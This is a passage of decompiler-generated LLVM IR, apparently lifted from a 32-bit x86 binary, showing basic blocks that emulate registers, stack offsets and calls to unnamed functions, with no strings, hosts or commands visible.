  %v2_8049566 = inttoptr i32 %v1_8049566 to i32*
  %v3_8049566 = load i32, i32* %v2_8049566, align 4
  store i32 %v3_8049566, i32* %eax.global-to-local, align 4
  %v1_8049569 = icmp eq i32 %v3_8049566, 0
  store i1 %v1_8049569, i1* %zf.global-to-local, align 1
  %v1_804956b = icmp eq i1 %v1_8049569, false
  br i1 %v1_804956b, label %dec_label_pc_804958e, label %dec_label_pc_804956d

dec_label_pc_804956d:                             ; preds = %dec_label_pc_8049562
  %v1_804956d = add i32 %v3_8049562, 8
  %v2_804956d = inttoptr i32 %v1_804956d to i32*
  %v3_804956d = load i32, i32* %v2_804956d, align 4
  %v12_804956d = icmp eq i32 %v3_804956d, 1
  store i1 %v12_804956d, i1* %zf.global-to-local, align 1
  br i1 %v12_804956d, label %dec_label_pc_80496da, label %dec_label_pc_8049577

dec_label_pc_8049577:                             ; preds = %dec_label_pc_804956d
  %v3_8049577 = load i32, i32* %v2_8049562, align 4
  store i32 %v3_8049577, i32* %ecx.global-to-local, align 4
  %v1_804957b = add i32 %v3_8049577, 660
  %v2_804957b = inttoptr i32 %v1_804957b to i32*
  %v3_804957b = load i32, i32* %v2_804957b, align 4
  %v1_8049581 = load i32, i32* @ebx, align 4
  %v2_8049581 = sub i32 %v3_804957b, %v1_8049581
  %v12_8049581 = icmp eq i32 %v2_8049581, 0
  store i32 %v2_8049581, i32* %eax.global-to-local, align 4
  %v2_8049583 = add i32 %v3_8049577, 12
  %v3_8049583 = inttoptr i32 %v2_8049583 to i32*
  store i32 %v2_8049581, i32* %v3_8049583, align 4
  store i1 %v12_8049581, i1* %zf.global-to-local, align 1
  br i1 %v12_8049581, label %dec_label_pc_8049af8, label %dec_label_pc_804958e

dec_label_pc_804958e:                             ; preds = %dec_label_pc_8049577, %dec_label_pc_8049562, %dec_label_pc_80496da, %dec_label_pc_8049764
  %v0_804958e = load i32, i32* @ebx, align 4
  %v1_804958e = icmp eq i32 %v0_804958e, 0
  store i1 %v1_804958e, i1* %zf.global-to-local, align 1
  br i1 %v1_804958e, label %dec_label_pc_80495e0, label %dec_label_pc_8049592

dec_label_pc_8049592:                             ; preds = %dec_label_pc_804958e
  %v0_8049592 = load i32, i32* @esp, align 4
  %v1_8049592 = add i32 %v0_8049592, 92
  %v2_8049592 = inttoptr i32 %v1_8049592 to i32*
  %v3_8049592 = load i32, i32* %v2_8049592, align 4
  store i32 %v3_8049592, i32* %edx.global-to-local, align 4
  %v1_8049596 = add i32 %v3_8049592, 660
  %v2_8049596 = inttoptr i32 %v1_8049596 to i32*
  %v3_8049596 = load i32, i32* %v2_8049596, align 4
  %v2_804959c = sub i32 %v3_8049596, %v0_804958e
  %v12_804959c = icmp eq i32 %v2_804959c, 0
  store i1 %v12_804959c, i1* %zf.global-to-local, align 1
  store i32 %v2_804959c, i32* %eax.global-to-local, align 4
  store i32 %v2_804959c, i32* %v2_8049596, align 4
  %v0_80495a4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80495a4 = load i32, i32* @esp, align 4
  %v2_80495a4 = add i32 %v1_80495a4, -4
  %v3_80495a4 = inttoptr i32 %v2_80495a4 to i32*
  store i32 %v0_80495a4, i32* %v3_80495a4, align 4
  %v0_80495a5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80495a5 = add i32 %v1_80495a4, -8
  %v3_80495a5 = inttoptr i32 %v2_80495a5 to i32*
  store i32 %v0_80495a5, i32* %v3_80495a5, align 4
  %v0_80495a6 = load i32, i32* @esi, align 4
  %v1_80495a6 = load i32, i32* @ebx, align 4
  %v2_80495a6 = add i32 %v1_80495a6, %v0_80495a6
  store i32 %v2_80495a6, i32* %eax.global-to-local, align 4
  %v2_80495a9 = add i32 %v1_80495a4, -12
  %v3_80495a9 = inttoptr i32 %v2_80495a9 to i32*
  store i32 %v2_80495a6, i32* %v3_80495a9, align 4
  %v0_80495aa = load i32, i32* @esi, align 4
  %v2_80495aa = add i32 %v1_80495a4, -16
  %v3_80495aa = inttoptr i32 %v2_80495aa to i32*
  store i32 %v0_80495aa, i32* %v3_80495aa, align 4
  %v4_80495ab = call i32 @function_8051fe3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80495ab, i32* %eax.global-to-local, align 4
  %v0_80495b0 = load i32, i32* @esp, align 4
  %v1_80495b0 = add i32 %v0_80495b0, 108
  %v2_80495b0 = inttoptr i32 %v1_80495b0 to i32*
  %v3_80495b0 = load i32, i32* %v2_80495b0, align 4
  store i32 %v3_80495b0, i32* %ecx.global-to-local, align 4
  %v1_80495b4 = add i32 %v0_80495b0, 92
  %v2_80495b4 = inttoptr i32 %v1_80495b4 to i32*
  %v3_80495b4 = load i32, i32* %v2_80495b4, align 4
  store i32 %v3_80495b4, i32* %edx.global-to-local, align 4
  %v1_80495b8 = add i32 %v3_80495b0, 660
  %v2_80495b8 = inttoptr i32 %v1_80495b8 to i32*
  %v3_80495b8 = load i32, i32* %v2_80495b8, align 4
  store i32 %v3_80495b8, i32* %eax.global-to-local, align 4
  %v1_80495c1 = icmp eq i32 %v3_80495b8, 0
  store i1 %v1_80495c1, i1* %zf.global-to-local, align 1
  %v2_80495c3 = add i32 %v3_80495b4, 2116
  %v3_80495c3 = add i32 %v2_80495c3, %v3_80495b8
  %v4_80495c3 = inttoptr i32 %v3_80495c3 to i8*
  store i8 0, i8* %v4_80495c3, align 1
  %v0_80495cb = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80495cb, label %dec_label_pc_80495e0, label %dec_label_pc_80495cd

dec_label_pc_80495cd:                             ; preds = %dec_label_pc_8049592
  %v0_80495cd = load i32, i32* @esp, align 4
  %v1_80495cd = add i32 %v0_80495cd, 92
  %v2_80495cd = inttoptr i32 %v1_80495cd to i32*
  %v3_80495cd = load i32, i32* %v2_80495cd, align 4
  store i32 %v3_80495cd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80495d1

dec_label_pc_80495d1:                             ; preds = %dec_label_pc_8049521, %dec_label_pc_80495cd
  %v0_8049542 = phi i32 [ %v0_80495d1.pre, %dec_label_pc_8049521 ], [ %v3_80495cd, %dec_label_pc_80495cd ]
  %v1_80495d1 = add i32 %v0_8049542, 12
  %v2_80495d1 = inttoptr i32 %v1_80495d1 to i32*
  %v3_80495d1 = load i32, i32* %v2_80495d1, align 4
  store i32 %v3_80495d1, i32* %eax.global-to-local, align 4
  %v1_80495d4 = icmp eq i32 %v3_80495d1, 0
  store i1 %v1_80495d4, i1* %zf.global-to-local, align 1
  %tmp146 = icmp slt i32 %v3_80495d1, 1
  %tmp147 = icmp eq i1 %tmp146, false
  br i1 %tmp147, label %dec_label_pc_8049542, label %dec_label_pc_80495dc

dec_label_pc_80495dc:                             ; preds = %dec_label_pc_80495d1
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8049562

dec_label_pc_80495e0:                             ; preds = %dec_label_pc_8049592, %dec_label_pc_804958e
  %v0_80495e0 = load i32, i32* @esp, align 4
  %v1_80495e0 = add i32 %v0_80495e0, 92
  %v2_80495e0 = inttoptr i32 %v1_80495e0 to i32*
  %v3_80495e0 = load i32, i32* %v2_80495e0, align 4
  store i32 %v3_80495e0, i32* %eax.global-to-local, align 4
  %v1_80495e4 = add i32 %v3_80495e0, -1448
  %v2_80495e4 = inttoptr i32 %v1_80495e4 to i8*
  %v3_80495e4 = load i8, i8* %v2_80495e4, align 1
  %v12_80495e4 = icmp eq i8 %v3_80495e4, 7
  store i1 %v12_80495e4, i1* %zf.global-to-local, align 1
  %v1_80495eb = icmp eq i1 %v12_80495e4, false
  br i1 %v1_80495eb, label %dec_label_pc_8048d91, label %dec_label_pc_80495f1

dec_label_pc_80495f1:                             ; preds = %dec_label_pc_80495e0
  %v3_80495f1 = load i32, i32* %v2_80495e0, align 4
  store i32 %v3_80495f1, i32* %edx.global-to-local, align 4
  %v1_80495f5 = add i32 %v3_80495f1, 660
  %v2_80495f5 = inttoptr i32 %v1_80495f5 to i32*
  %v3_80495f5 = load i32, i32* %v2_80495f5, align 4
  %v9_80495f5 = icmp eq i32 %v3_80495f5, 1024
  store i1 %v9_80495f5, i1* %zf.global-to-local, align 1
  %v1_80495ff = icmp eq i1 %v9_80495f5, false
  br i1 %v1_80495ff, label %dec_label_pc_80494dc, label %dec_label_pc_8049605

dec_label_pc_8049605:                             ; preds = %dec_label_pc_80495f1, %dec_label_pc_80494af
  %v1_8049605 = phi i32 [ %v0_80494b4, %dec_label_pc_80494af ], [ %v0_80495e0, %dec_label_pc_80495f1 ]
  %v0_8049605 = phi i32 [ %v1_80494af, %dec_label_pc_80494af ], [ %v3_80495e0, %dec_label_pc_80495f1 ]
  %v2_8049605 = add i32 %v1_8049605, -4
  %v3_8049605 = inttoptr i32 %v2_8049605 to i32*
  store i32 %v0_8049605, i32* %v3_8049605, align 4
  %v1_8049606 = add i32 %v1_8049605, -8
  %v2_8049606 = inttoptr i32 %v1_8049606 to i32*
  store i32 960, i32* %v2_8049606, align 4
  %v1_804960b = add i32 %v1_8049605, 76
  %v2_804960b = inttoptr i32 %v1_804960b to i32*
  %v3_804960b = load i32, i32* %v2_804960b, align 4
  %v1_804960f = add i32 %v3_804960b, 2180
  %v9_804960f = icmp eq i32 %v1_804960f, 0
  store i1 %v9_804960f, i1* %zf.global-to-local, align 1
  store i32 %v1_804960f, i32* %eax.global-to-local, align 4
  %v2_8049614 = add i32 %v1_8049605, -12
  %v3_8049614 = inttoptr i32 %v2_8049614 to i32*
  store i32 %v1_804960f, i32* %v3_8049614, align 4
  %v0_8049615 = load i32, i32* @esi, align 4
  %v2_8049615 = add i32 %v1_8049605, -16
  %v3_8049615 = inttoptr i32 %v2_8049615 to i32*
  store i32 %v0_8049615, i32* %v3_8049615, align 4
  %v4_8049616 = call i32 @function_8051fe3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049616, i32* %eax.global-to-local, align 4
  %v0_804961b = load i32, i32* @esp, align 4
  %v1_804961b = add i32 %v0_804961b, 108
  %v2_804961b = inttoptr i32 %v1_804961b to i32*
  %v3_804961b = load i32, i32* %v2_804961b, align 4
  store i32 %v3_804961b, i32* %ecx.global-to-local, align 4
  %v1_804961f = add i32 %v3_804961b, 660
  %v2_804961f = inttoptr i32 %v1_804961f to i32*
  %v3_804961f = load i32, i32* %v2_804961f, align 4
  %v1_8049628 = add i32 %v3_804961f, -64
  %v6_8049628 = icmp eq i32 %v1_8049628, 0
  store i1 %v6_8049628, i1* %zf.global-to-local, align 1
  store i32 %v1_8049628, i32* %eax.global-to-local, align 4
  store i32 %v1_8049628, i32* %v2_804961f, align 4
  %v0_80494dc.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80494dc

dec_label_pc_8049636:                             ; preds = %dec_label_pc_8049550
  %v0_8049636 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049636 = load i32, i32* @esp, align 4
  %v2_8049636 = add i32 %v1_8049636, -4
  %v3_8049636 = inttoptr i32 %v2_8049636 to i32*
  store i32 %v0_8049636, i32* %v3_8049636, align 4
  %v0_8049637 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049637 = add i32 %v1_8049636, -8
  %v3_8049637 = inttoptr i32 %v2_8049637 to i32*
  store i32 %v0_8049637, i32* %v3_8049637, align 4
  %v1_8049638 = add i32 %v1_8049636, -12
  %v2_8049638 = inttoptr i32 %v1_8049638 to i32*
  store i32 0, i32* %v2_8049638, align 4
  %v1_804963a = add i32 %v1_8049636, -16
  %v2_804963a = inttoptr i32 %v1_804963a to i32*
  store i32 36, i32* %v2_804963a, align 4
  %v3_804963c = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804963c, i32* %eax.global-to-local, align 4
  %v0_8049641 = load i32, i32* @esp, align 4
  %v1_8049641 = add i32 %v0_8049641, -4
  %v2_8049641 = inttoptr i32 %v1_8049641 to i32*
  store i32 11, i32* %v2_8049641, align 4
  %v2_8049643 = add i32 %v0_8049641, -8
  %v3_8049643 = inttoptr i32 %v2_8049643 to i32*
  store i32 %v3_804963c, i32* %v3_8049643, align 4
  %v1_8049644 = add i32 %v0_8049641, 108
  %v2_8049644 = inttoptr i32 %v1_8049644 to i32*
  %v3_8049644 = load i32, i32* %v2_8049644, align 4
  store i32 %v3_8049644, i32* %ecx.global-to-local, align 4
  %v1_8049648 = add i32 %v3_8049644, 660
  %v2_8049648 = inttoptr i32 %v1_8049648 to i32*
  %v3_8049648 = load i32, i32* %v2_8049648, align 4
  store i32 %v3_8049648, i32* %eax.global-to-local, align 4
  %v2_804964e = add i32 %v0_8049641, -12
  %v3_804964e = inttoptr i32 %v2_804964e to i32*
  store i32 %v3_8049648, i32* %v3_804964e, align 4
  %v0_804964f = load i32, i32* @esi, align 4
  %v2_804964f = add i32 %v0_8049641, -16
  %v3_804964f = inttoptr i32 %v2_804964f to i32*
  store i32 %v0_804964f, i32* %v3_804964f, align 4
  %v0_8049650 = call i32 @function_8051590()
  %v0_8049655 = load i32, i32* @esp, align 4
  %v1_8049658 = add i32 %v0_8049650, 1
  %v8_8049658 = icmp eq i32 %v1_8049658, 0
  store i1 %v8_8049658, i1* %zf.global-to-local, align 1
  store i32 %v1_8049658, i32* %eax.global-to-local, align 4
  br i1 %v8_8049658, label %dec_label_pc_8049562, label %dec_label_pc_804965f

dec_label_pc_804965f:                             ; preds = %dec_label_pc_8049636
  %v2_804965f = add i32 %v0_8049655, 28
  %v3_804965f = inttoptr i32 %v2_804965f to i32*
  store i32 %v1_8049658, i32* %v3_804965f, align 4
  %v0_8049660 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049660 = add i32 %v0_8049655, 24
  %v3_8049660 = inttoptr i32 %v2_8049660 to i32*
  store i32 %v0_8049660, i32* %v3_8049660, align 4
  %v1_8049661 = add i32 %v0_8049655, 20
  %v2_8049661 = inttoptr i32 %v1_8049661 to i32*
  store i32 0, i32* %v2_8049661, align 4
  %v1_8049663 = add i32 %v0_8049655, 16
  %v2_8049663 = inttoptr i32 %v1_8049663 to i32*
  store i32 36, i32* %v2_8049663, align 4
  %v3_8049665 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049665, i32* %eax.global-to-local, align 4
  %v0_804966a = load i32, i32* @esp, align 4
  %v1_804966a = add i32 %v0_804966a, -4
  %v2_804966a = inttoptr i32 %v1_804966a to i32*
  store i32 11, i32* %v2_804966a, align 4
  %v2_804966c = add i32 %v0_804966a, -8
  %v3_804966c = inttoptr i32 %v2_804966c to i32*
  store i32 %v3_8049665, i32* %v3_804966c, align 4
  %v1_804966d = add i32 %v0_804966a, 108
  %v2_804966d = inttoptr i32 %v1_804966d to i32*
  %v3_804966d = load i32, i32* %v2_804966d, align 4
  store i32 %v3_804966d, i32* %eax.global-to-local, align 4
  %v1_8049671 = add i32 %v3_804966d, 660
  %v2_8049671 = inttoptr i32 %v1_8049671 to i32*
  %v3_8049671 = load i32, i32* %v2_8049671, align 4
  store i32 %v3_8049671, i32* %eax.global-to-local, align 4
  %v2_8049677 = add i32 %v0_804966a, -12
  %v3_8049677 = inttoptr i32 %v2_8049677 to i32*
  store i32 %v3_8049671, i32* %v3_8049677, align 4
  %v0_8049678 = load i32, i32* @esi, align 4
  %v2_8049678 = add i32 %v0_804966a, -16
  %v3_8049678 = inttoptr i32 %v2_8049678 to i32*
  store i32 %v0_8049678, i32* %v3_8049678, align 4
  %v0_8049679 = call i32 @function_8051590()
  store i32 %v0_8049679, i32* %eax.global-to-local, align 4
  %v0_804967e = load i32, i32* @esp, align 4
  %v1_8049681 = add i32 %v0_804967e, 28
  %v2_8049681 = inttoptr i32 %v1_8049681 to i32*
  store i32 1, i32* %v2_8049681, align 4
  %v1_8049683 = add i32 %v0_804967e, 24
  %v2_8049683 = inttoptr i32 %v1_8049683 to i32*
  store i32 ptrtoint (i32* @global_var_80543ba.16 to i32), i32* %v2_8049683, align 4
  %v1_8049688 = add i32 %v0_804967e, 124
  %v2_8049688 = inttoptr i32 %v1_8049688 to i32*
  %v3_8049688 = load i32, i32* %v2_8049688, align 4
  store i32 %v3_8049688, i32* %edx.global-to-local, align 4
  store i32 %v0_8049679, i32* @ebx, align 4
  %v0_804968e = load i32, i32* @esi, align 4
  %v2_804968e = add i32 %v0_804968e, %v0_8049679
  store i32 %v2_804968e, i32* @edi, align 4
  %v1_8049691 = add i32 %v3_8049688, 660
  %v2_8049691 = inttoptr i32 %v1_8049691 to i32*
  %v3_8049691 = load i32, i32* %v2_8049691, align 4
  %v2_8049697 = sub i32 %v3_8049691, %v0_8049679
  %v12_8049697 = icmp eq i32 %v2_8049697, 0
  store i1 %v12_8049697, i1* %zf.global-to-local, align 1
  store i32 %v2_8049697, i32* %eax.global-to-local, align 4
  %v2_8049699 = add i32 %v0_804967e, 20
  %v3_8049699 = inttoptr i32 %v2_8049699 to i32*
  store i32 %v2_8049697, i32* %v3_8049699, align 4
  %v0_804969a = load i32, i32* @edi, align 4
  %v2_804969a = add i32 %v0_804967e, 16
  %v3_804969a = inttoptr i32 %v2_804969a to i32*
  store i32 %v0_804969a, i32* %v3_804969a, align 4
  %v0_804969b = call i32 @function_8051590()
  store i32 %v0_804969b, i32* %eax.global-to-local, align 4
  %v0_80496a0 = load i32, i32* @esp, align 4
  %v1_80496a0 = add i32 %v0_80496a0, 92
  %v2_80496a0 = inttoptr i32 %v1_80496a0 to i32*
  %v3_80496a0 = load i32, i32* %v2_80496a0, align 4
  store i32 %v3_80496a0, i32* %ecx.global-to-local, align 4
  %v0_80496a4 = load i32, i32* @ebx, align 4
  %v2_80496a4 = add i32 %v0_80496a4, %v0_804969b
  store i32 %v2_80496a4, i32* @ebx, align 4
  %v2_80496a6 = add i32 %v0_80496a0, 56
  %v3_80496a6 = inttoptr i32 %v2_80496a6 to i32*
  store i32 %v2_80496a4, i32* %v3_80496a6, align 4
  %v0_80496ad = load i32, i32* @ebx, align 4
  %v1_80496ad = load i32, i32* %ecx.global-to-local, align 4
  %v2_80496ad = add i32 %v0_80496ad, 2115
  %v3_80496ad = add i32 %v2_80496ad, %v1_80496ad
  %v4_80496ad = inttoptr i32 %v3_80496ad to i8*
  store i8 0, i8* %v4_80496ad, align 1
  %v0_80496b5 = load i32, i32* @esp, align 4
  %v1_80496b5 = add i32 %v0_80496b5, 92
  %v2_80496b5 = inttoptr i32 %v1_80496b5 to i32*
  %v3_80496b5 = load i32, i32* %v2_80496b5, align 4
  store i32 %v3_80496b5, i32* %eax.global-to-local, align 4
  %v1_80496b9 = add i32 %v3_80496b5, 16
  %v2_80496b9 = inttoptr i32 %v1_80496b9 to i32*
  %v3_80496b9 = load i32, i32* %v2_80496b9, align 4
  %v4_80496b9 = add i32 %v3_80496b9, -4
  %v9_80496b9 = sub i32 3, %v3_80496b9
  %v10_80496b9 = and i32 %v9_80496b9, %v3_80496b9
  %v11_80496b9 = icmp slt i32 %v10_80496b9, 0
  %v12_80496b9 = icmp eq i32 %v4_80496b9, 0
  store i1 %v12_80496b9, i1* %zf.global-to-local, align 1
  %v13_80496b9 = icmp slt i32 %v4_80496b9, 0
  %v3_80496bd = icmp ne i1 %v13_80496b9, %v11_80496b9
  %v4_80496bd = or i1 %v12_80496b9, %v3_80496bd
  br i1 %v4_80496bd, label %dec_label_pc_8049da3, label %dec_label_pc_80496c3

dec_label_pc_80496c3:                             ; preds = %dec_label_pc_8049da3, %dec_label_pc_804965f, %dec_label_pc_8049db8
  %v0_80496c3 = phi i32 [ %v1_8049dac, %dec_label_pc_8049da3 ], [ %v0_80496b5, %dec_label_pc_804965f ], [ %v0_80496c3.pre, %dec_label_pc_8049db8 ]
  %v1_80496c3 = add i32 %v0_80496c3, 92
  %v2_80496c3 = inttoptr i32 %v1_80496c3 to i32*
  %v3_80496c3 = load i32, i32* %v2_80496c3, align 4
  store i32 %v3_80496c3, i32* %edx.global-to-local, align 4
  %v1_80496c7 = add i32 %v3_80496c3, 12
  %v2_80496c7 = inttoptr i32 %v1_80496c7 to i32*
  store i32 -1, i32* %v2_80496c7, align 4
  %v0_80496ce = load i32, i32* %edx.global-to-local, align 4
  %v1_80496ce = add i32 %v0_80496ce, -1448
  %v2_80496ce = inttoptr i32 %v1_80496ce to i8*
  store i8 10, i8* %v2_80496ce, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_80496da:                             ; preds = %dec_label_pc_804956d
  %v1_80496da = add i32 %v0_8049562, -4
  %v2_80496da = inttoptr i32 %v1_80496da to i32*
  store i32 2, i32* %v2_80496da, align 4
  %v1_80496dc = add i32 %v0_8049562, -8
  %v2_80496dc = inttoptr i32 %v1_80496dc to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v2_80496dc, align 4
  %v0_80496e1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80496e1 = add i32 %v0_80496e1, 660
  %v2_80496e1 = inttoptr i32 %v1_80496e1 to i32*
  %v3_80496e1 = load i32, i32* %v2_80496e1, align 4
  store i32 %v3_80496e1, i32* %eax.global-to-local, align 4
  %v2_80496e7 = add i32 %v0_8049562, -12
  %v3_80496e7 = inttoptr i32 %v2_80496e7 to i32*
  store i32 %v3_80496e1, i32* %v3_80496e7, align 4
  %v0_80496e8 = load i32, i32* @esi, align 4
  %v2_80496e8 = add i32 %v0_8049562, -16
  %v3_80496e8 = inttoptr i32 %v2_80496e8 to i32*
  store i32 %v0_80496e8, i32* %v3_80496e8, align 4
  %v0_80496e9 = call i32 @function_8051590()
  %v0_80496ee = load i32, i32* @esp, align 4
  %v1_80496f1 = add i32 %v0_80496e9, 1
  %v8_80496f1 = icmp eq i32 %v1_80496f1, 0
  store i1 %v8_80496f1, i1* %zf.global-to-local, align 1
  store i32 %v1_80496f1, i32* %eax.global-to-local, align 4
  br i1 %v8_80496f1, label %dec_label_pc_804958e, label %dec_label_pc_80496f8

dec_label_pc_80496f8:                             ; preds = %dec_label_pc_80496da
  %v1_80496f8 = add i32 %v0_80496ee, 12
  %v2_80496f8 = inttoptr i32 %v1_80496f8 to i32*
  store i32 2, i32* %v2_80496f8, align 4
  %v1_80496fa = add i32 %v0_80496ee, 8
  %v2_80496fa = inttoptr i32 %v1_80496fa to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v2_80496fa, align 4
  %v1_80496ff = add i32 %v0_80496ee, 108
  %v2_80496ff = inttoptr i32 %v1_80496ff to i32*
  %v3_80496ff = load i32, i32* %v2_80496ff, align 4
  store i32 %v3_80496ff, i32* %eax.global-to-local, align 4
  %v1_8049703 = add i32 %v3_80496ff, 660
  %v2_8049703 = inttoptr i32 %v1_8049703 to i32*
  %v3_8049703 = load i32, i32* %v2_8049703, align 4
  %v2_8049709 = add i32 %v0_80496ee, 4
  %v3_8049709 = inttoptr i32 %v2_8049709 to i32*
  store i32 %v3_8049703, i32* %v3_8049709, align 4
  %v0_804970a = load i32, i32* @esi, align 4
  %v3_804970a = inttoptr i32 %v0_80496ee to i32*
  store i32 %v0_804970a, i32* %v3_804970a, align 4
  %v0_804970b = call i32 @function_8051590()
  store i32 %v0_804970b, i32* %eax.global-to-local, align 4
  %v0_8049710 = load i32, i32* @esp, align 4
  %v1_8049710 = add i32 %v0_8049710, 92
  %v2_8049710 = inttoptr i32 %v1_8049710 to i32*
  %v3_8049710 = load i32, i32* %v2_8049710, align 4
  store i32 %v3_8049710, i32* %edx.global-to-local, align 4
  store i32 %v0_804970b, i32* @ebx, align 4
  %v2_8049716 = add i32 %v0_804970b, 2114
  %v3_8049716 = add i32 %v2_8049716, %v3_8049710
  %v4_8049716 = inttoptr i32 %v3_8049716 to i8*
  store i8 0, i8* %v4_8049716, align 1
  %v0_804971e = load i32, i32* @esp, align 4
  %v1_804971e = add i32 %v0_804971e, -4
  %v2_804971e = inttoptr i32 %v1_804971e to i32*
  store i32 1, i32* %v2_804971e, align 4
  %v1_8049720 = add i32 %v0_804971e, -8
  %v2_8049720 = inttoptr i32 %v1_8049720 to i32*
  store i32 ptrtoint (i32* @global_var_80543a9.14 to i32), i32* %v2_8049720, align 4
  %v2_8049725 = add i32 %v0_804971e, -12
  %v3_8049725 = inttoptr i32 %v2_8049725 to i32*
  store i32 %v0_804970b, i32* %v3_8049725, align 4
  %v0_8049726 = load i32, i32* @esi, align 4
  %v2_8049726 = add i32 %v0_804971e, -16
  %v3_8049726 = inttoptr i32 %v2_8049726 to i32*
  store i32 %v0_8049726, i32* %v3_8049726, align 4
  %v0_8049727 = call i32 @function_8051590()
  %v0_804972c = load i32, i32* @esp, align 4
  %v1_804972c = add i32 %v0_804972c, 32
  %v1_804972f = add i32 %v0_8049727, 1
  %v8_804972f = icmp eq i32 %v1_804972f, 0
  store i1 %v8_804972f, i1* %zf.global-to-local, align 1
  store i32 %v1_804972f, i32* %eax.global-to-local, align 4
  br i1 %v8_804972f, label %dec_label_pc_804974f, label %dec_label_pc_8049732

dec_label_pc_8049732:                             ; preds = %dec_label_pc_80496f8
  %v1_8049732 = add i32 %v0_804972c, 28
  %v2_8049732 = inttoptr i32 %v1_8049732 to i32*
  store i32 1, i32* %v2_8049732, align 4
  %v1_8049734 = add i32 %v0_804972c, 24
  %v2_8049734 = inttoptr i32 %v1_8049734 to i32*
  store i32 ptrtoint (i32* @global_var_80543a9.14 to i32), i32* %v2_8049734, align 4
  %v0_8049739 = load i32, i32* @ebx, align 4
  %v2_8049739 = add i32 %v0_804972c, 20
  %v3_8049739 = inttoptr i32 %v2_8049739 to i32*
  store i32 %v0_8049739, i32* %v3_8049739, align 4
  %v0_804973a = load i32, i32* @esi, align 4
  %v2_804973a = add i32 %v0_804972c, 16
  %v3_804973a = inttoptr i32 %v2_804973a to i32*
  store i32 %v0_804973a, i32* %v3_804973a, align 4
  %v0_804973b = call i32 @function_8051590()
  store i32 %v0_804973b, i32* %eax.global-to-local, align 4
  %v0_8049740 = load i32, i32* @esp, align 4
  %v1_8049740 = add i32 %v0_8049740, 92
  %v2_8049740 = inttoptr i32 %v1_8049740 to i32*
  %v3_8049740 = load i32, i32* %v2_8049740, align 4
  store i32 %v3_8049740, i32* @ecx, align 4
  %v6_8049744 = icmp eq i32 %v0_8049740, -16
  store i1 %v6_8049744, i1* %zf.global-to-local, align 1
  %v2_8049747 = add i32 %v0_804973b, 2116
  %v3_8049747 = add i32 %v2_8049747, %v3_8049740
  %v4_8049747 = inttoptr i32 %v3_8049747 to i8*
  store i8 0, i8* %v4_8049747, align 1
  %v1_804974f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804974f

dec_label_pc_804974f:                             ; preds = %dec_label_pc_80496f8, %dec_label_pc_8049732
  %v1_804974f = phi i32 [ %v1_804972c, %dec_label_pc_80496f8 ], [ %v1_804974f.pre, %dec_label_pc_8049732 ]
  %v0_804974f = load i32, i32* @ecx, align 4
  %v2_804974f = add i32 %v1_804974f, -4
  %v3_804974f = inttoptr i32 %v2_804974f to i32*
  store i32 %v0_804974f, i32* %v3_804974f, align 4
  %v0_8049750 = load i32, i32* @ecx, align 4
  %v2_8049750 = add i32 %v1_804974f, -8
  %v3_8049750 = inttoptr i32 %v2_8049750 to i32*
  store i32 %v0_8049750, i32* %v3_8049750, align 4
  %v1_8049751 = add i32 %v1_804974f, -12
  %v2_8049751 = inttoptr i32 %v1_8049751 to i32*
  store i32 16, i32* %v2_8049751, align 4
  %v0_8049753 = load i32, i32* @esi, align 4
  %v2_8049753 = add i32 %v1_804974f, -16
  %v3_8049753 = inttoptr i32 %v2_8049753 to i32*
  store i32 %v0_8049753, i32* %v3_8049753, align 4
  %v3_8049754 = call i32 @function_80515e0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049754, i32* %eax.global-to-local, align 4
  %v0_8049759 = load i32, i32* @esp, align 4
  %v1_804975c = icmp eq i32 %v3_8049754, 0
  store i1 %v1_804975c, i1* %zf.global-to-local, align 1
  %v1_8049e5a = add i32 %v0_8049759, 108
  %v2_8049e5a = inttoptr i32 %v1_8049e5a to i32*
  %v3_8049e5a = load i32, i32* %v2_8049e5a, align 4
  br i1 %v1_804975c, label %dec_label_pc_8049e5a, label %dec_label_pc_8049764

dec_label_pc_8049764:                             ; preds = %dec_label_pc_804974f
  store i32 %v3_8049e5a, i32* %edx.global-to-local, align 4
  %v1_8049768 = add i32 %v3_8049754, 2
  %v9_8049768 = icmp eq i32 %v1_8049768, 0
  store i1 %v9_8049768, i1* %zf.global-to-local, align 1
  store i32 %v1_8049768, i32* %eax.global-to-local, align 4
  %v2_804976b = add i32 %v3_8049e5a, 12
  %v3_804976b = inttoptr i32 %v2_804976b to i32*
  store i32 %v1_8049768, i32* %v3_804976b, align 4
  br label %dec_label_pc_804958e

dec_label_pc_8049773:                             ; preds = %dec_label_pc_804854f
  %v1_8049773 = add i32 %v0_80485a5, -1440
  %v2_8049773 = inttoptr i32 %v1_8049773 to i32*
  %v3_8049773 = load i32, i32* %v2_8049773, align 4
  %v1_804977b = urem i32 %v3_8049773, 32
  store i32 %v1_804977b, i32* %eax.global-to-local, align 4
  %v2_804977e = udiv i32 %v3_8049773, 32
  store i32 %v2_804977e, i32* %edx.global-to-local, align 4
  %v0_8049781 = load i32, i32* @esp, align 4
  %v2_8049781 = mul nuw nsw i32 %v2_804977e, 4
  %v3_8049781 = add nuw nsw i32 %v2_8049781, 20740
  %v4_8049781 = add i32 %v3_8049781, %v0_8049781
  %v5_8049781 = inttoptr i32 %v4_8049781 to i32*
  %v6_8049781 = load i32, i32* %v5_8049781, align 4
